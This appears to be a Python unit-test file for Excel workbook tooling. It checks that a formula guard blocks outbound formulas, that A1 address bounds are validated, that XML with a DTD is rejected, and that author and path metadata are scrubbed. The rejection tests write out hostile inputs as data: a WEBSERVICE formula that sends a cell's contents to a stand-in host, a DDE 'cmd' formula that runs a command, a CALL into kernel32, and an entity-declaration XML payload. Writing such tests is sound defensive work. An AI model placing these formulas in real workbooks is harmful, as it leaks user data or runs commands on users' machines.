"""Office-free checks for formula guards, A1 bounds and package scrubbing."""

import os
from pathlib import Path
import sys
from tempfile import TemporaryDirectory
import unittest
from unittest import mock
from zipfile import ZipFile

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from tools.excel_objects import check_formula, parse_ops, valid_a1  # noqa: E402
from tools.excel_package import local_traces, parse_xml, scrub_package  # noqa: E402

RELS = ('<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/'
        'relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>')
TYPES = '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>'


class FormulaGuard(unittest.TestCase):
    def test_allows_workbook_local_formulas(self):
        for formula in ('=SUM(A1:A3)', '=Sales[Amount]*2', "='My Sheet'!B2", '=HYPERLINK("#A1","go")',
                        '="a|b"&"http://x"', '=XLOOKUP(A1,Data[Key],Data[Value])', '=Table1[@Col]'):
            self.assertEqual(check_formula(formula), formula)

    def test_rejects_outbound_formulas(self):
        for formula in ('=WEBSERVICE("http://example.invalid/?d="&A1)', '=_xlfn.IMAGE("https://x/y.png")',
                        '=RTD("prog.id",,"topic")', '=CALL("kernel32","GetTickCount","J")',
                        "='C:\\data\\[Book.xlsx]Sheet1'!A1", '=[Other.xlsx]Sheet1!A1',
                        "='\\\\server\\share\\[b.xlsx]S'!A1", '=[1]Sheet1!A1', '=cmd|\'/c calc\'!A0',
                        'SUM(A1)'):
            with self.assertRaises(ValueError, msg=formula):
                check_formula(formula)

    def test_plan_rejects_named_external_reference(self):
        document = {"version": 1, "operations": [
            {"id": "n", "op": "name.set", "name": "Leak", "refers_to": "=[Other.xlsx]Sheet1!$A$1"}]}
        with self.assertRaises(ValueError):
            parse_ops(document)


class A1Bounds(unittest.TestCase):
    def test_bounds(self):
        for address in ("A1", "$A$1:$XFD$1048576", "b2:c3"):
            self.assertTrue(valid_a1(address), address)
        for address in ("XFE1", "A1048577", "A0", "A1:B", "", None, "Sheet1!A1"):
            self.assertFalse(valid_a1(address), address)


class PackageHygiene(unittest.TestCase):
    def test_rejects_dtd_in_utf8_and_utf16(self):
        payload = '<!DOCTYPE a [<!ENTITY x "y">]><a>&x;</a>'
        for data in (payload.encode("utf-8"), payload.encode("utf-16-le")):
            with self.assertRaises(ValueError):
                parse_xml(data)

    def test_scrub_removes_author_and_build_folder(self):
        with TemporaryDirectory() as folder:
            source, output = Path(folder) / "in.xlam", Path(folder) / "out.xlam"
            with ZipFile(source, "w") as archive:
                archive.writestr("_rels/.rels", RELS)
                archive.writestr("[Content_Types].xml", TYPES)
                archive.writestr("xl/workbook.xml",
                                 '<workbook><x15ac:absPath url="C:\\Users\\someone\\kit\\" '
                                 'xmlns:x15ac="urn:x"/><sheets/></workbook>')
                archive.writestr("docProps/core.xml",
                                 "<cp:coreProperties><dc:creator>Some Person</dc:creator>"
                                 "<cp:lastModifiedBy>Some Person</cp:lastModifiedBy></cp:coreProperties>")
                archive.writestr("docProps/app.xml", "<Properties><Company>Acme</Company></Properties>")
            with mock.patch.dict(os.environ, {"USERNAME": "someone", "USERPROFILE": "", "COMPUTERNAME": ""}):
                self.assertEqual(sorted(local_traces(source)), ["xl/workbook.xml"])
                scrub_package(source, output)
                self.assertEqual(local_traces(output), [])
            with ZipFile(output) as archive:
                self.assertNotIn(b"absPath", archive.read("xl/workbook.xml"))
                self.assertNotIn(b"Some Person", archive.read("docProps/core.xml"))
                self.assertIn(b"<dc:creator></dc:creator>", archive.read("docProps/core.xml"))
                self.assertNotIn(b"Acme", archive.read("docProps/app.xml"))


if __name__ == "__main__":
    unittest.main()
